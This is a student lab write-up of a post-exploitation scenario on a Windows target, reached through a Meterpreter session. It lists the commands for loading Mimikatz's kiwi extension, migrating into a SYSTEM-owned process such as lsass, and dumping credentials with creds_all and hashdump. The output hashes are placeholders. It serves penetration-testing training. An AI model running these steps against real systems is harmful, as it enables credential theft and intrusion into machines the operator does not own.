# Scenario 4 - Credential Dumping with Meterpreter

## Objective

Dump credentials from a compromised Windows machine using the Meterpreter session in Kali Linux.

---

## Tools Used

* **Kali Linux**
* **Metasploit Framework**
* **Meterpreter**
* **Mimikatz (Kiwi extension)**

---

## Steps Followed

### 🔐 Step 1: Establish Meterpreter Session

Successfully exploited a vulnerability and obtained a Meterpreter shell on the target Windows system.

```bash
msf6 exploit(...) > exploit
[*] Meterpreter session 1 opened
```

---

### 🔍 Step 2: Load Kiwi (Mimikatz)

```bash
meterpreter > load kiwi
```

Output:

```
[+] kiwi extension loaded successfully
```

---

### ⚠️ Step 3: Attempt to Dump Credentials

```bash
meterpreter > creds_all
```

Output:

```
[!] Not running as SYSTEM, execution may fail
```

---

### 🧠 Step 4: Identify SYSTEM-owned Process

```bash
meterpreter > ps
```

Identified `lsass.exe` or `services.exe` running as `NT AUTHORITY\SYSTEM`.

---

### 🔁 Step 5: Migrate to SYSTEM Process

```bash
meterpreter > migrate <PID>
```

Output:

```
[*] Migration completed successfully.
```

---

### ✅ Step 6: Confirm SYSTEM Privileges

```bash
meterpreter > getuid
```

Expected:

```
Server username: NT AUTHORITY\SYSTEM
```

---

### 💥 Step 7: Dump Credentials Again

```bash
meterpreter > creds_all
```

OR

```bash
meterpreter > run post/windows/gather/hashdump
```

Output:

```
[+] Admin:500:NTLM-HASH-HERE:::
[+] User:1001:NTLM-HASH-HERE:::
```

---

## Notes

* Direct download of mimikatz.exe failed due to network or HTTP issue.
* Kiwi was used as a reliable in-memory alternative to execute mimikatz functionalities.
* SYSTEM-level access is **mandatory** for dumping credentials from LSASS or registry.

---

## Screenshots Included

* PowerShell and Invoke-WebRequest failed attempt
* Meterpreter migration
* Credential dumping success after SYSTEM migration

---

## Conclusion

Credential dumping can fail if Meterpreter does not have SYSTEM-level privileges. Always migrate into a SYSTEM-owned process before executing sensitive post-exploitation tasks like `hashdump` or `kiwi` modules.

---

**Submitted by:** Dhruvik Vaghasiya
**Scenario:** 4 - Post Exploitation: Credential Dumping
